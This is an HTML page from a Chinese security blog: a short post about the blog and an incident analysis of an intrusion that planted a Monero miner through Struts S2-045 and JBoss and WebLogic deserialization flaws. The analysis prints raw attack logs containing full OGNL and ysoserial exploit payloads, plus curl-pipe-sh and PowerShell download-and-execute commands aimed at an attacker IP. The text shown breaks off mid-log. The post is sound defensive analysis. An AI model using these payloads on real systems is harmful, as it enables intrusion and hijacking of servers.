<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>SY0U&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="一半技术 一半生活">
<meta property="og:type" content="website">
<meta property="og:title" content="SY0U&#39;s Blog">
<meta property="og:url" content="http://wsygoogol.github.io/index.html">
<meta property="og:site_name" content="SY0U&#39;s Blog">
<meta property="og:description" content="一半技术 一半生活">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="SY0U&#39;s Blog">
<meta name="twitter:description" content="一半技术 一半生活">
  
    <link rel="alternate" href="/atom.xml" title="SY0U&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">SY0U&#39;s Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-About-the-Blog" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/06/08/About-the-Blog/" class="article-date">
  <time datetime="2016-06-08T10:54:05.000Z" itemprop="datePublished">2016-06-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/06/08/About-the-Blog/">About the Blog</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>之前的用wordpress + mysql在阿里云搭建了一套博客，域名是( <a href="http://wsygoogol.cn" target="_blank" rel="external">http://wsygoogol.cn</a> )维护成本比较高，被人用扫描器扫一下直接被阿里云下线。加上也懒得去写博客了，域名和主机都因为未续费被回收了。<br>最近两年的漏洞分析和技术分享文章都发在公司博客、公司内网论坛、公司公众号上，比较乱。平时看文章看到好多人都在用Hexo，一直想弄一个，因为一些事情耽搁了，最近试了一下还真不错。就在github上搭一个，虽然由于大家都懂的的原因有点慢。但是流量应该不会太大，需求也没那么多，暂时先用着，如果有需求再迁移吧。<br>我决定用这个博客，记录工作和学习中的踩过的坑，把学到的知识和经验分享出来。我也经常在知乎上回答一些问题，写一些生活的感悟和读书笔记。如果好的，以后也会同步过来。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/06/08/About-the-Blog/" data-id="cjca1zrwa0008881bdqr7bsq6" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-利用java反序列化漏洞植入门罗币挖矿程序事件分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/10/利用java反序列化漏洞植入门罗币挖矿程序事件分析/" class="article-date">
  <time datetime="2018-01-10T13:11:50.000Z" itemprop="datePublished">2018-01-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/10/利用java反序列化漏洞植入门罗币挖矿程序事件分析/">利用java反序列化漏洞植入门罗币挖矿程序事件分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>近期检测到某台主机利用多个漏洞植入挖矿程序的行为，下面简单分析一下：</p>
<p>最近几天<strong>45.123.190.147</strong>这个ip，连续发起恶意请求，相关日志如下：</p>
<p>s2-045相关日志：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">45.123.190.147 51977 172.17.0.2 8080 - - [08/Jan/2018:15:59:08 +0000] <span class="string">"POST /orders.xhtml HTTP/1.1"</span> [--9b4e930e84c24dd896eac1be4a4dfa8c</div><div class="line">Content-Disposition: form-data; name=<span class="string">"fieldNameHere"</span>; filename=<span class="string">"123.html"</span></div><div class="line"></div><div class="line">testtest</div><div class="line">--9b4e930e84c24dd896eac1be4a4dfa8c--</div><div class="line">] 400 - [python-requests/2.18.4] [%&#123;(<span class="comment">#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='curl 45.123.190.178/lin.txt | sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.134 2715</span></div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">45.123.190.147 49290 172.17.0.2 8080 - - [07/Jan/2018:02:51:10 +0000] <span class="string">"POST /orders.xhtml HTTP/1.1"</span> [--167f39dfb34648d58ec2d781097677a6</div><div class="line">Content-Disposition: form-data; name=<span class="string">"fieldNameHere"</span>; filename=<span class="string">"123.html"</span></div><div class="line"></div><div class="line">testtest</div><div class="line">--167f39dfb34648d58ec2d781097677a6--</div><div class="line">] 400 - [python-requests/2.18.4] [%&#123;(<span class="comment">#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='powershell -nop -c "iex(New-Object Net.WebClient).DownloadString(\'http://45.123.190.178/win.txt\')"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.798 2715</span></div></pre></td></tr></table></figure>
<p>可以看到这里利用的是 S2-045 漏洞，发送恶意 ognl 表达式，关键命令是从远程服务器下载脚本并执行，稍后再看这两个脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">curl 45.123.190.178/lin.txt | sh</div><div class="line">powershell -nop -c <span class="string">"iex(New-Object Net.WebClient).DownloadString(\'http://45.123.190.178/win.txt\')"</span></div></pre></td></tr></table></figure>
<p>weblogic wls反序列化漏洞相关日志：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">45.123.190.147 34220 172.17.0.2 8080 - - [08/Jan/2018:16:05:05 +0000] <span class="string">"GET /wls-wsat/CoordinatorPortType11 HTTP/1.1"</span> [] 404 - [python-requests/2.18.4] [-] 0.011 1051</div><div class="line">45.123.190.147 34280 172.17.0.2 8080 - - [08/Jan/2018:16:05:05 +0000] <span class="string">"GET /wls-wsat/CoordinatorPortType HTTP/1.1"</span> [] 404 - [python-requests/2.18.4] [-] 0.003 1051</div></pre></td></tr></table></figure>
<p>它探测了 wls-wsat 模块是否存在，这个模块联系到前几天爆发的weblogic wls反序列化漏洞，如果能够访问存在缺陷的模块就发起攻击，说明 XMLDecoder 漏洞也正在被用于黑产行为</p>
<p> JBoss JMXInvokerServlet 反序列化漏洞相关日志：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">45.123.190.147 58694 172.17.0.2 8080 - - [08/Jan/2018:17:27:44 +0000] <span class="string">"GET /invoker/JMXInvokerServlet HTTP/1.1"</span> [�� sr 2sun.reflect.annotation.AnnotationInvocationHandlerU���~� L memberValuest Ljava/util/Map;L typet Ljava/lang/Class;xps&#125; java.util.Mapxr java.lang.reflect.Proxy�<span class="string">'� �C� L ht %Ljava/lang/reflect/InvocationHandler;xpsq ~ sr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantt Ljava/lang/Object;xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNamet Ljava/lang/String;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t</span></div><div class="line">getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ vr java.lang.String��8z;�B xpvq ~ sq ~ uq ~ puq ~ t invokeuq ~ vr java.lang.Object xpvq ~ sq ~ ur [Ljava.lang.String;��V��&#123;G xp t fpowershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString('http://45.123.190.178/win.txt<span class="string">')"t execuq ~ q ~ #sq ~ sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</span></div><div class="line">loadFactorI thresholdxp?@ w xxvr java.lang.Override xpq ~ :] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class="org".jboss.invocation.MarshalledValue] 0.008 1049</div><div class="line"></div><div class="line"></div><div class="line">45.123.190.147 58733 172.17.0.2 8080 - - [08/Jan/2018:17:27:44 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" [�� sr .javax.management.BadAttributeValueExpException��ګc-F@ L valt Ljava/lang/Object;xr java.lang.Exception��&gt;;� xr java.lang.Throwable��5'9w�� L causet Ljava/lang/Throwable;L detailMessaget Ljava/lang/String;[</div><div class="line">stackTracet [Ljava/lang/StackTraceElement;L suppressedExceptionst Ljava/util/List;xpq ~ pur [Ljava.lang.StackTraceElement;F*&lt;&lt;�<span class="string">"9 xp sr java.lang.StackTraceElementa Ś&amp;6݅ I</span></div><div class="line">lineNumberL declaringClassq ~ L fileNameq ~ L</div><div class="line">methodNameq ~ xp St &amp;ysoserial.payloads.CommonsCollections5t CommonsCollections5.javat getObjectsq ~ 5q ~ q ~ q ~ sq ~ "t ysoserial.GeneratePayloadt GeneratePayload.javat mainsr &amp;java.util.Collections<span class="variable">$UnmodifiableList</span>�%1�� L listq ~ xr ,java.util.Collections<span class="variable">$UnmodifiableCollectionB</span> ��^� L ct Ljava/util/Collection;xpsr java.util.ArrayListx����a� I sizexp w xq ~ xsr 4org.apache.commons.collections.keyvalue.TiedMapEntry��қ9�� L keyq ~ L mapt Ljava/util/Map;xpt foosr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantq ~ xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNameq ~ [ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t</div><div class="line">getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ 2 vr java.lang.String��8z;�B xpvq ~ 2sq ~ +uq ~ / puq ~ / t invokeuq ~ 2 vr java.lang.Object xpvq ~ /sq ~ +ur [Ljava.lang.String;��V��&#123;G xp t fpowershell.exe -nop -c <span class="string">"iex(New-Object Net.WebClient).DownloadString('http://45.123.190.178/win.txt')"</span>t execuq ~ 2 q ~ 7sq ~ <span class="string">'sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</span></div><div class="line">loadFactorI thresholdxp?@ w xx] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class="org".jboss.invocation.MarshalledValue] 0.002 1049</div><div class="line"></div><div class="line">45.123.190.147 54900 172.17.0.2 8080 - - [08/Jan/2018:19:24:35 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" [�� sr 2sun.reflect.annotation.AnnotationInvocationHandlerU���~� L memberValuest Ljava/util/Map;L typet Ljava/lang/Class;xps&#125; java.util.Mapxr java.lang.reflect.Proxy�'� �C� L ht %Ljava/lang/reflect/InvocationHandler;xpsq ~ sr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantt Ljava/lang/Object;xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNamet Ljava/lang/String;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ vr java.lang.String��8z;�B xpvq ~ sq ~ uq ~ puq ~ t invokeuq ~ vr java.lang.Object xpvq ~ sq ~ ur [Ljava.lang.String;��V��&#123;G xp t Qbash -c &#123;<span class="built_in">echo</span>,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;t execuq ~ q ~ <span class="comment">#sq ~ sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</span></div><div class="line"></div><div class="line">loadFactorI thresholdxp?@ w xxvr java.lang.Override xpq ~ :] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class=<span class="string">"org"</span>.jboss.invocation.MarshalledValue] 0.009 1049</div><div class="line"></div><div class="line">45.123.190.147 55001 172.17.0.2 8080 - - [08/Jan/2018:19:24:35 +0000] <span class="string">"GET /invoker/JMXInvokerServlet HTTP/1.1"</span> [�� sr java.util.HashSet�D�����4 xpw ?@ sr 4org.apache.commons.collections.keyvalue.TiedMapEntry��қ9�� L keyt Ljava/lang/Object;L mapt Ljava/util/Map;xpt foosr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantq ~ xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNamet Ljava/lang/String;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t</div><div class="line">getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ vr java.lang.String��8z;�B xpvq ~ sq ~ uq ~ puq ~ t invokeuq ~ vr java.lang.Object xpvq ~ sq ~ ur [Ljava.lang.String;��V��&#123;G xp t Qbash -c &#123;<span class="built_in">echo</span>,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;t execuq ~ q ~ sq ~ sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</div><div class="line">loadFactorI thresholdxp?@ w xxx] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class=<span class="string">"org"</span>.jboss.invocation.MarshalledValue] 0.003 1049</div><div class="line"></div><div class="line">45.123.190.147 55040 172.17.0.2 8080 - - [08/Jan/2018:19:24:36 +0000] <span class="string">"GET /invoker/JMXInvokerServlet HTTP/1.1"</span> [�� sr .javax.management.BadAttributeValueExpException��ګc-F@ L valt Ljava/lang/Object;xr java.lang.Exception��&gt;;� xr java.lang.Throwable��5<span class="string">'9w�� L causet Ljava/lang/Throwable;L detailMessaget Ljava/lang/String;[</span></div><div class="line">stackTracet [Ljava/lang/StackTraceElement;L suppressedExceptionst Ljava/util/List;xpq ~ pur [Ljava.lang.StackTraceElement;F*&lt;&lt;�"9 xp sr java.lang.StackTraceElementa Ś&amp;6݅ I</div><div class="line">lineNumberL declaringClassq ~ L fileNameq ~ L</div><div class="line">methodNameq ~ xp St &amp;ysoserial.payloads.CommonsCollections5t CommonsCollections5.javat getObjectsq ~ 5q ~ q ~ q ~ sq ~ "t ysoserial.GeneratePayloadt GeneratePayload.javat mainsr &amp;java.util.Collections$UnmodifiableList�%1�� L listq ~ xr ,java.util.Collections$UnmodifiableCollectionB ��^� L ct Ljava/util/Collection;xpsr java.util.ArrayListx����a� I sizexp w xq ~ xsr 4org.apache.commons.collections.keyvalue.TiedMapEntry��қ9�� L keyq ~ L mapt Ljava/util/Map;xpt foosr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantq ~ xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNameq ~ [ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t</div><div class="line">getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ 2 vr java.lang.String��8z;�B xpvq ~ 2sq ~ +uq ~ / puq ~ / t invokeuq ~ 2 vr java.lang.Object xpvq ~ /sq ~ +ur [Ljava.lang.String;��V��&#123;G xp t Qbash -c &#123;echo,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;t execuq ~ 2 q ~ 7sq ~ 'sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</div><div class="line">loadFactorI thresholdxp?@ w xx] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class=<span class="string">"org"</span>.jboss.invocation.MarshalledValue] 0.003 1049</div><div class="line"></div><div class="line">45.123.190.147 55074 172.17.0.2 8080 - - [08/Jan/2018:19:24:36 +0000] <span class="string">"GET /invoker/JMXInvokerServlet HTTP/1.1"</span> [�� sr java.util.PriorityQueue��0��?�� I sizeL</div><div class="line">comparatort Ljava/util/Comparator;xp sr Borg.apache.commons.collections4.comparators.TransformingComparator/���+�� L decoratedq ~ L transformert -Lorg/apache/commons/collections4/Transformer;xpsr @org.apache.commons.collections4.comparators.ComparableComparator���%�n�7 xpsr ;org.apache.commons.collections4.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst .[Lorg/apache/commons/collections4/Transformer;xpur .[Lorg.apache.commons.collections4.Transformer;9�:��?� xp sr &lt;org.apache.commons.collections4.functors.ConstantTransformerXv�A�� L iConstantt Ljava/lang/Object;xpvr 7com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter xpsr ?org.apache.commons.collections4.functors.InstantiateTransformer4�����; [ iArgst [Ljava/lang/Object;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp sr :com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl WO�n��3 I _indentNumberI _transletIndex[</div><div class="line">_bytecodest [[B[ _classq ~ L _namet Ljava/lang/String;L _outputPropertiest Ljava/util/Properties;xp ����ur [[BK�gg�7 xp ur [B���T� xp ����� 2 9</div><div class="line"><span class="string">" 7 % &amp; serialVersionUID J ConstantValue� ����&gt; &lt;init&gt; ()V Code LineNumberTable LocalVariableTable this StubTransletPayload InnerClasses 5Lysoserial/payloads/util/Gadgets<span class="variable">$StubTransletPayload</span>; transform r(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V document -Lcom/sun/org/apache/xalan/internal/xsltc/DOM; handlers B[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;</span></div><div class="line">Exceptions ' �(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V iterator 5Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator; handler ALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;</div><div class="line">SourceFile Gadgets.java</div><div class="line">( 3ysoserial/payloads/util/Gadgets<span class="variable">$StubTransletPayload</span> @com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet java/io/Serializable 9com/sun/org/apache/xalan/internal/xsltc/TransletException ysoserial/payloads/util/Gadgets &lt;clinit&gt; java/lang/Runtime *</div><div class="line">getRuntime ()Ljava/lang/Runtime; , -</div><div class="line">+ . Qbash -c &#123;echo,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 0 exec '(Ljava/lang/String;)Ljava/lang/Process; 2 3</div><div class="line">+ 4 StackMapTable ysoserial/Pwner3888495553177549 !Lysoserial/Pwner3888495553177549; !</div><div class="line">/ *� � . 8 ? � 3 8 I � 7 * 8 ) $ � L� /1� 5W� 6 !</div><div class="line"># uq ~ ����� 2</div><div class="line">serialVersionUID J ConstantValueq�i�&lt;mG &lt;init&gt; ()V Code LineNumberTable LocalVariableTable this Foo InnerClasses %Lysoserial/payloads/util/Gadgets<span class="variable">$Foo</span>;</div><div class="line">SourceFile Gadgets.java</div><div class="line">#ysoserial/payloads/util/Gadgets<span class="variable">$Foo</span> java/lang/Object java/io/Serializable ysoserial/payloads/util/Gadgets !</div><div class="line">/ *� � ;</div><div class="line">pt Pwnrpw xur [Ljava.lang.Class;�׮��Z� xp vr javax.xml.transform.Templates xpw sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp q ~ )x] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class="org<span class="string">".jboss.invocation.MarshalledValue] 0.005 1049</span></div><div class="line"></div><div class="line">45.123.190.147 55115 172.17.0.2 8080 - - [08/Jan/2018:19:24:36 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1<span class="string">" [�� sr 2sun.reflect.annotation.AnnotationInvocationHandlerU���~� L memberValuest Ljava/util/Map;L typet Ljava/lang/Class;xps&#125; java.util.Mapxr java.lang.reflect.Proxy�'� �C� L ht %Ljava/lang/reflect/InvocationHandler;xpsq ~ sr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantt Ljava/lang/Object;xpvr 7com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter xpsr &gt;org.apache.commons.collections.functors.InstantiateTransformer4�����; [ iArgst [Ljava/lang/Object;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp sr :com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl WO�n��3 I _indentNumberI _transletIndex[</span></div><div class="line">_bytecodest [[B[ _classq ~ L _namet Ljava/lang/String;L _outputPropertiest Ljava/util/Properties;xp ����ur [[BK�gg�7 xp ur [B���T� xp ����� 2 9</div><div class="line">" 7 % &amp; serialVersionUID J ConstantValue� ����&gt; &lt;init&gt; ()V Code LineNumberTable LocalVariableTable this StubTransletPayload InnerClasses 5Lysoserial/payloads/util/Gadgets<span class="variable">$StubTransletPayload</span>; transform r(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V document -Lcom/sun/org/apache/xalan/internal/xsltc/DOM; handlers B[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;</div><div class="line">Exceptions <span class="string">' �(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V iterator 5Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator; handler ALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;</span></div><div class="line">SourceFile Gadgets.java</div><div class="line">( 3ysoserial/payloads/util/Gadgets$StubTransletPayload @com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet java/io/Serializable 9com/sun/org/apache/xalan/internal/xsltc/TransletException ysoserial/payloads/util/Gadgets &lt;clinit&gt; java/lang/Runtime *</div><div class="line">getRuntime ()Ljava/lang/Runtime; , -</div><div class="line">+ . Qbash -c &#123;echo,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 0 exec '(Ljava/lang/String;)Ljava/lang/Process; 2 3</div><div class="line">+ 4 StackMapTable ysoserial/Pwner3888495209839455 !Lysoserial/Pwner3888495209839455; !</div><div class="line">/ *� � . 8 ? � 3 8 I � 7 * 8 ) $ � L� /1� 5W� 6 !</div><div class="line"><span class="comment"># uq ~ # ����� 2</span></div><div class="line">serialVersionUID J ConstantValueq�i�&lt;mG &lt;init&gt; ()V Code LineNumberTable LocalVariableTable this Foo InnerClasses %Lysoserial/payloads/util/Gadgets<span class="variable">$Foo</span>;</div><div class="line">SourceFile Gadgets.java</div><div class="line"><span class="comment">#ysoserial/payloads/util/Gadgets$Foo java/lang/Object java/io/Serializable ysoserial/payloads/util/Gadgets !</span></div><div class="line">/ *� � ;</div><div class="line">pt Pwnrpw xur [Ljava.lang.Class;�׮��Z� xp vr javax.xml.transform.Templates xpsr java.util.HashMap���`� F</div><div class="line">loadFactorI thresholdxp?@ w xxvr java.lang.Override xpq ~ .] 404 - [Mozilla/5.0 